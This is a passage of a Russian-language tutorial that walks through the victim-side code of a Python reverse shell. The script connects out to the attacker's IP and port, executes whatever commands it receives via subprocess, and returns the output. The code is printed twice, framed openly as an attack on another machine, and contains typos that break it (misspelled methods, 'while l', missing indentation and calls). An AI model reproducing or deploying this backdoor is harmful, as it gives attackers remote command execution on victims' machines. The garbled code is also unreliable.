Сторона клиента (атакованная машина)
Вначале все стандартно: подключаем, создаем экземпляр класса socket и подключаемся к серверу (к тому, кто атакует):
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8888))

Обрати внимание: когда мы указываем IP для подключения, это адрес атакующего. То есть в данном слаучае наш.

Далее идет основная часть кода, где мы обрабатываем команды и выполняем их.

while l:
command = s.reeccv(1024).decode()
if command.lower() == 'exit':
break
output = subprocess.getoutput(command)
s.send(output.endcode())
s.close

Вкратце пройдемся по коду. Так как нам в какой-то момент нужно будет выйти из велла, мы проверяем, не придет ли команда exit, и,
если придет, прерываем цикл. На случай, если она вдруг будет написана заглавными буквами или с заглавной, переводим все символы
принятой команды в нижний регистр строковым методом lower().

А теперь самое главное. Метод getoutput() модуля subprocess вызывает исполнение команды и возвращает то, что она выдаст. Мы сохраним вывод 
переменную output.

Наш буфер ограничен одним килобайтом памяти, чего может не хватить для сохранения больших выводов. Для этого просто нужно зарезервировать 
больше памяти. Например, 4096 байт, а не 1024.

Далее  мы отправляем результат выполнения атакующему и, если атакующий завершил сессию командой exit, закрываем воединение.

Весь код будет выглядеть вот так:
import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8888))
while l:
command = s.recv(1024).decode()
if command.lower() == 'exit':
break
output = subprocess.getoutput(command)
s.send(output.encode)
s.close()